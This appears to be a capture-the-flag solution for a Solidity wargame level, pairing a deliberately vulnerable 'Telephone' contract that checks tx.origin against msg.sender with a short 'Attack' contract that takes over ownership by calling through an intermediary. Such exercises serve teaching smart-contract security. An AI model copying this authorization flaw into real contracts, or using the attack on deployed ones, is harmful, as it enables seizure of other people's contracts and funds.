//Claim ownership of the contract below to complete this level.

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

contract Attack {
    Telephone telephone;

    constructor(address tel) {
        telephone = Telephone(tel);
    }

    function attack(address owner) external {
        telephone.changeOwner(owner);
    }
}
